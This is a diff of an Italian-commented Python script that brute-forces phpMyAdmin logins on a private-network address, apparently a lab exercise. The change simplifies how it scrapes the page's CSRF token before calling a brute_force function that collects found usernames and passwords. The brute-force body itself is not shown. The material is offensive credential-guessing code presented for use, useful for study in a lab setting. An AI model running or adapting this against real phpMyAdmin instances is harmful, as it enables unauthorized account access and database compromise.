@@ -20,12 +20,6 @@ session = requests.Session()
 # Funzione per ottenere il token e il phpmyadmin
 def extract_values(url, session):
     
-    # Dizionario che contiene il token e il phpmyadmin
-    dict_values = {
-        'token':'',
-        'phpmyadmin':''
-    }
-
     # Effettua una richiesta GET alla pagina web utilizzando la sessione
     response = session.get(url)
 
@@ -37,25 +31,16 @@ def extract_values(url, session):
         # Trova il tag <input> con name='token' e estrae il suo valore 'value'
         token_tag = soup.find('input', {'name': 'token'})
         if token_tag:
-            dict_values['token'] = token_tag.get('value')
+            ex_token = token_tag.get('value')
         else:
             print("Token non trovato nella pagina.")
-            return None
-        
-        # Trova il tag <input> con name='phpmyadmin' ed estrae il suo valore 'value'
-        phpmyadmin_tag = soup.find('input', {'name': 'phpMyAdmin'})
-
-        if phpmyadmin_tag:
-            dict_values['phpmyadmin'] = phpmyadmin_tag.get('value')
-        else:
-            print("phpmyadmin non trovato nella pagina.")
             return None
     else:
         print(f"Errore nella richiesta GET: {response.status_code} - {response.reason}")
         return None
 
     # Restituiamo il dizionario contenente i valori estrati    
-    return dict_values       
+    return ex_token       
 
 # Funzione brute force
 def brute_force(url, session):
@@ -93,15 +78,14 @@ def brute_force(url, session):
 
 
 # Chiamata della funzione neccessaria ad estrare token e phpmyadin 
-dict_extract_values = extract_values(url, session)
+token = extract_values(url, session)
     
 # COntrolla se token e phpmyadmin sono stati trovati    
-if dict_extract_values['token'] != '':
-    if dict_extract_values['phpmyadmin'] != '':
-        # Url ottenuto con token e phpmyadmin
-        new_url = f'http://192.168.50.101/phpMyAdmin/index.php?token={dict_extract_values['token']}' #&phpMyAdmin={dict_extract_values['phpmyadmin']}'
-        # Lista contenente gli user e password trovati
-        list = brute_force(new_url, session)
+if token != '':
+    # Url ottenuto con token e phpmyadmin
+    new_url = f'http://192.168.50.101/phpMyAdmin/index.php?token={token}'
+    # Lista contenente gli user e password trovati
+    list = brute_force(new_url, session)
 
 for item in list:
     print(item)
